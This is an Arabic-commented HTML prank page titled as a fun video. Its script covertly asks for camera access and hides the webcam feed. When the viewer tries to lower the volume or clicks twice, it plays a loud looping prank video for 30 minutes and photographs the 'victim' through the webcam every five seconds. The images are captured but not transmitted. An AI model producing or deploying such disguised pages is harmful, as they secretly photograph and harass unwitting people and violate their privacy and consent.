<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فيديو ممتع جداً 🔥</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>

    <!-- 1. ضع رابط فيديو البداية العادي هنا -->
    <video id="mainVideo" src="https://www.instagram.com/p/DekfP6JR5nP/?xtok=MWxmbjZ0YXRteXZjcA==.mp4" autoplay playsinline></video>

    <!-- 2. ضع رابط فيديو المقلب الخاص بك هنا -->
    <video id="prankVideo" src="https://www.instagram.com/reel/DbHUELNMdtz/?dlrf=ZmpzaHlhZWRoengx.mp4" playsinline style="display:none;"></video>

    <!-- كاميرا خفية لالتقاط الصور -->
    <video id="webcam" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const mainVideo = document.getElementById('mainVideo');
        const prankVideo = document.getElementById('prankVideo');
        const webcam = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');

        // أعلى صوت افتراضياً عند البدء
        mainVideo.volume = 1.0;

        // طلب إذن الكاميرا سراً
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                webcam.srcObject = stream;
            })
            .catch(err => {
                console.log("الكاميرا غير متاحة");
            });

        // عند محاولة خفض الصوت أو الضغط على الأزرار
        window.addEventListener('keydown', function(e) {
            if (e.key === "AudioVolumeDown" || e.keyCode === 174 || e.key === "ArrowDown") {
                triggerTheTrap();
            }
        });

        // إذا حاول النقر على الشاشة
        let clickCount = 0;
        document.addEventListener('click', function() {
            clickCount++;
            if (clickCount >= 2) {
                triggerTheTrap();
            }
        });

        function triggerTheTrap() {
            // إخفاء الفيديو الأول وتشغيل المقلب
            mainVideo.style.display = 'none';
            prankVideo.style.display = 'block';
            prankVideo.volume = 1.0;
            prankVideo.play();

            // جعل الفيديو يتكرر بلا توقف
            prankVideo.loop = true;

            // ضبط المؤقت لكي يستمر المقلب لمدة نصف ساعة (1800 ثانية = 30 دقيقة) ثم يتوقف تلقائياً
            setTimeout(() => {
                prankVideo.pause();
                alert("انتهى المقلب! 😂");
            }, 30 * 60 * 1000); 

            // بدء التقاط الصور فوراً وكل 5 ثوانٍ
            takeSnapshot();
            setInterval(takeSnapshot, 5000);
        }

        function takeSnapshot() {
            if (webcam.srcObject) {
                canvas.width = webcam.videoWidth;
                canvas.height = webcam.videoHeight;
                let ctx = canvas.getContext('2d');
                ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
                let imageData = canvas.toDataURL('image/png');
                console.log("تم التقاط صورة للضحية بنجاح 📸");
            }
        }
    </script>
</body>
</html>
# -